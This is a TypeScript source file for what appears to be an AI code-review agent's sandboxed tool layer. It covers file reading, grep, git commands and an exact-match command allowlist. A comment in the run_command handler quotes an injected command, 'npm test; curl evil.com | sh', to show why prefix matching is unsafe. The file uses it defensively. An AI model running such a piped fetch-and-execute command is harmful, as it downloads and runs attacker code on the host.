import type { ToolDefinition } from "@maestro/llm";
import type { Sandbox } from "@maestro/sandbox";
import { SUBMIT_FINDINGS_JSON_SCHEMA } from "./finding.js";

/**
 * Caps on a single read. An unbounded read of a lockfile or a generated file is what
 * exceeded a model's context window in practice — three of them cost more tokens than
 * the whole diff. The loop's history trimming is the safety net; this is the fix.
 */
const MAX_READ_LINES = 300;
const MAX_READ_CHARS = 32_000;

/**
 * The agent tool surface.
 *
 * Every one of these executes INSIDE the analyze container. Implementing them host-side
 * would be easier and would silently discard the isolation the whole design rests on:
 * an agent reading files through a host-side helper is an agent reading the host.
 *
 * The surface is read-only by construction. There is no write tool, no network tool and
 * no GitHub tool — only the orchestrator posts, using a token agents never see.
 */

export const TOOL_DEFINITIONS: Record<string, ToolDefinition> = {
  read_file: {
    name: "read_file",
    description: `Read a file from the checkout. Returns numbered lines so you can cite exact locations. At most ${MAX_READ_LINES} lines per call — request a specific range for anything larger.`,
    inputSchema: {
      type: "object",
      properties: {
        path: { type: "string", description: "Repo-relative path" },
        startLine: { type: "integer", minimum: 1 },
        endLine: { type: "integer", minimum: 1 },
      },
      required: ["path"],
      additionalProperties: false,
    },
  },
  list_dir: {
    name: "list_dir",
    description: "List a directory in the checkout.",
    inputSchema: {
      type: "object",
      properties: { path: { type: "string", description: "Repo-relative path; defaults to root" } },
      additionalProperties: false,
    },
  },
  grep: {
    name: "grep",
    description:
      "Search the checkout with a regular expression. Use this to find related code before claiming something is duplicated or missing.",
    inputSchema: {
      type: "object",
      properties: {
        pattern: { type: "string" },
        path: { type: "string", description: "Restrict the search to this subtree" },
        maxResults: { type: "integer", minimum: 1, maximum: 200 },
      },
      required: ["pattern"],
      additionalProperties: false,
    },
  },
  git_diff: {
    name: "git_diff",
    description: "Show the diff under review. With no arguments, returns the full change.",
    inputSchema: {
      type: "object",
      properties: {
        path: { type: "string", description: "Restrict the diff to one path" },
        stat: { type: "boolean", description: "Return a summary instead of full hunks" },
      },
      additionalProperties: false,
    },
  },
  git_log: {
    name: "git_log",
    description: "Recent commit history, to understand how this code got here.",
    inputSchema: {
      type: "object",
      properties: { path: { type: "string" }, limit: { type: "integer", minimum: 1, maximum: 50 } },
      additionalProperties: false,
    },
  },
  git_blame: {
    name: "git_blame",
    description: "Who last changed these lines, and when.",
    inputSchema: {
      type: "object",
      properties: {
        path: { type: "string" },
        lineStart: { type: "integer", minimum: 1 },
        lineEnd: { type: "integer", minimum: 1 },
      },
      required: ["path"],
      additionalProperties: false,
    },
  },
  run_command: {
    name: "run_command",
    description:
      "Run one of the repo's allowlisted build/test/lint commands and return its real output. A finding backed by a failing command is worth far more than a guess.",
    inputSchema: {
      type: "object",
      properties: {
        command: { type: "string", description: "Must match an allowlisted command exactly" },
      },
      required: ["command"],
      additionalProperties: false,
    },
  },
  submit_findings: {
    name: "submit_findings",
    description:
      "Submit your findings and end your review. Call this exactly once. An empty findings list is a valid result.",
    inputSchema: SUBMIT_FINDINGS_JSON_SCHEMA as unknown as Record<string, unknown>,
  },
};

export const TERMINAL_TOOL = "submit_findings";

export interface ToolContext {
  sandbox: Sandbox;
  /** Exact commands `run_command` will accept. */
  allowedCommands: string[];
  /** Base ref for git_diff; the merge-base of the PR. */
  baseRef: string;
  commandTimeoutSec: number;
  /** Records every command an agent actually ran, for the PR metrics block. */
  commandLog: { command: string; exitCode: number; durationMs: number }[];
}

function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

/** Refuses absolute paths and traversal: an agent's reach stops at the checkout. */
function safePath(input: unknown, fallback = "."): string | { error: string } {
  const p = typeof input === "string" && input.trim() ? input.trim() : fallback;
  if (p.startsWith("/") || p.split("/").includes("..")) {
    return { error: `path '${p}' is outside the checkout` };
  }
  return p;
}

export function buildDispatch(ctx: ToolContext) {
  return async (call: {
    name: string;
    input: unknown;
  }): Promise<{ output: string; isError?: boolean }> => {
    const input = (call.input ?? {}) as Record<string, unknown>;

    switch (call.name) {
      case "read_file": {
        const path = safePath(input.path);
        if (typeof path !== "string") return { output: path.error, isError: true };
        const start = Number(input.startLine ?? 1);
        const requestedEnd = Number(input.endLine ?? start + MAX_READ_LINES);
        const end = Math.min(requestedEnd, start + MAX_READ_LINES);
        // Numbered lines, so a finding can cite a location the reviewer can click.
        const res = await ctx.sandbox.exec(
          `sed -n ${shellQuote(`${start},${end}p`)} ${shellQuote(path)} | cat -n | sed ${shellQuote(`s/^/${start === 1 ? "" : ""}/`)}`,
        );
        if (res.exitCode !== 0)
          return { output: res.stderr.trim() || `cannot read ${path}`, isError: true };
        let text = renumber(res.stdout, start);
        // Say so when the range was cut short. A silent clamp is how an agent comes to
        // report that a function is never closed, having been shown only its first half.
        if (requestedEnd > end && text) {
          text += `\n… [clamped to ${MAX_READ_LINES} lines — the file continues; read from line ${end + 1}]`;
        }
        if (text.length > MAX_READ_CHARS) {
          return {
            output: `${text.slice(0, MAX_READ_CHARS)}\n… [truncated at ${MAX_READ_CHARS} characters — read a narrower line range]`,
          };
        }
        return { output: text || `(${path} is empty in that range)` };
      }

      case "list_dir": {
        const path = safePath(input.path);
        if (typeof path !== "string") return { output: path.error, isError: true };
        const res = await ctx.sandbox.exec(`ls -la ${shellQuote(path)}`);
        return res.exitCode === 0
          ? { output: res.stdout }
          : { output: res.stderr.trim() || `cannot list ${path}`, isError: true };
      }

      case "grep": {
        const pattern = String(input.pattern ?? "");
        if (!pattern) return { output: "pattern is required", isError: true };
        const path = safePath(input.path);
        if (typeof path !== "string") return { output: path.error, isError: true };
        const max = Math.min(Number(input.maxResults ?? 60), 200);
        const res = await ctx.sandbox.exec(
          `grep -rnI --exclude-dir=.git --exclude-dir=node_modules -E ${shellQuote(pattern)} ${shellQuote(path)} | head -n ${max}`,
        );
        // grep exits 1 on "no matches", which is an answer, not a failure.
        return { output: res.stdout.trim() || "(no matches)" };
      }

      case "git_diff": {
        const path = safePath(input.path, "");
        if (typeof path !== "string") return { output: path.error, isError: true };
        const flags = input.stat ? "--stat" : "--unified=3";
        const suffix = path ? ` -- ${shellQuote(path)}` : "";
        // Three-dot needs a merge base, which a shallow fetch may not have; two-dot is
        // the fallback. stderr is NOT discarded: swallowing it once turned a missing
        // `git` binary into a silent "(no changes)", and the agent duly reported the
        // empty diff as a defect in the code.
        const res = await ctx.sandbox.exec(
          `git diff ${flags} ${shellQuote(ctx.baseRef)}...HEAD${suffix} || git diff ${flags} ${shellQuote(ctx.baseRef)}${suffix}`,
        );
        if (res.exitCode !== 0) {
          return {
            output: `git diff failed: ${res.stderr.trim() || "unknown error"}`,
            isError: true,
          };
        }
        return { output: res.stdout.trim() || "(no changes between the base and this head)" };
      }

      case "git_log": {
        const path = safePath(input.path, "");
        if (typeof path !== "string") return { output: path.error, isError: true };
        const limit = Math.min(Number(input.limit ?? 10), 50);
        const suffix = path ? ` -- ${shellQuote(path)}` : "";
        const res = await ctx.sandbox.exec(`git log --oneline -n ${limit}${suffix}`);
        if (res.exitCode !== 0) {
          return {
            output: `git log failed: ${res.stderr.trim() || "unknown error"}`,
            isError: true,
          };
        }
        return { output: res.stdout.trim() || "(no history)" };
      }

      case "git_blame": {
        const path = safePath(input.path);
        if (typeof path !== "string") return { output: path.error, isError: true };
        const start = Number(input.lineStart ?? 1);
        const end = Number(input.lineEnd ?? start + 40);
        const res = await ctx.sandbox.exec(
          `git blame -L ${start},${end} --date=short ${shellQuote(path)}`,
        );
        return res.exitCode === 0
          ? { output: res.stdout }
          : { output: res.stderr.trim() || "blame unavailable", isError: true };
      }

      case "run_command": {
        const command = String(input.command ?? "").trim();
        // EXACT match, never a prefix: prefix matching would accept
        // "npm test; curl evil.com | sh" as an allowlisted "npm test".
        if (!ctx.allowedCommands.includes(command)) {
          return {
            output:
              `'${command}' is not allowlisted. You may run only:\n` +
              (ctx.allowedCommands.map((c) => `  ${c}`).join("\n") || "  (none)"),
            isError: true,
          };
        }
        const res = await ctx.sandbox.exec(command, { timeoutSec: ctx.commandTimeoutSec });
        ctx.commandLog.push({ command, exitCode: res.exitCode, durationMs: res.durationMs });
        const tail = (s: string, n = 8000) => (s.length > n ? `...\n${s.slice(-n)}` : s);

        return {
          output: [
            `exit=${res.exitCode}${res.timedOut ? " (timed out)" : ""}`,
            res.stdout && `stdout:\n${tail(res.stdout)}`,
            res.stderr && `stderr:\n${tail(res.stderr)}`,
          ]
            .filter(Boolean)
            .join("\n"),
        };
      }

      default:
        return { output: `unknown tool: ${call.name}`, isError: true };
    }
  };
}

/** `cat -n` always starts at 1; shift so cited line numbers match the real file. */
function renumber(text: string, start: number): string {
  if (start === 1) return text;
  return text
    .split("\n")
    .map((line) => {
      const m = /^\s*(\d+)\t(.*)$/.exec(line);
      if (!m) return line;
      return `${String(Number(m[1]) + start - 1).padStart(6)}\t${m[2]}`;
    })
    .join("\n");
}

export function toolsForAgent(names: string[]): ToolDefinition[] {
  const defs = names.map((n) => TOOL_DEFINITIONS[n]).filter((d): d is ToolDefinition => Boolean(d));
  // The terminal tool is always present: without it an agent has no way to finish.
  const submit = TOOL_DEFINITIONS[TERMINAL_TOOL];
  if (submit && !defs.some((d) => d.name === TERMINAL_TOOL)) defs.push(submit);
  return defs;
}
